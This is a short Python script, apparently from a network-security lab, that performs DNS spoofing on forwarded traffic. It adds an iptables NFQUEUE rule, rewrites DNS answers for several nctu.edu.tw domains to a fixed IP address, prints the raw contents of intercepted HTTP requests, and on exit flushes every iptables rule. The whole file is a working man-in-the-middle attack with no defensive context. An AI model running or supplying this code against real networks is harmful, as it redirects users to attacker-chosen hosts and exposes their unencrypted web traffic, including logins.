from scapy.all import DNSQR, DNS, IP, UDP, Raw, DNSRR
from scapy.layers.http import HTTPRequest
from netfilterqueue import NetfilterQueue
import os

spoof_addr = {
    b"edu.tw.": "140.113.207.246",
    b"nctu.edu.tw.": "140.113.207.246",
    b"www.nctu.edu.tw.": "140.113.207.246"
}

def read_pkt(packet):
    if packet[DNSQR].qname not in spoof_addr:
        return packet
    packet[DNS].an = DNSRR(rrname=packet[DNSQR].qname, rdata=spoof_addr[packet[DNSQR].qname])
    packet[DNS].ancount = 1
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    return packet

def process_packet(packet):
    spkt = IP(packet.get_payload())
    if spkt.haslayer(DNSRR):
        try:
            spkt = read_pkt(spkt)
        except IndexError:
            pass
        packet.set_payload(bytes(spkt))
    if spkt.haslayer(HTTPRequest):
        print( spkt[Raw])
    packet.accept()

Q = 0
os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(Q))
queue = NetfilterQueue()
try:
    queue.bind(Q, process_packet)
    queue.run()
except KeyboardInterrupt:
    os.system("iptables --flush")
    print('tables flushed')


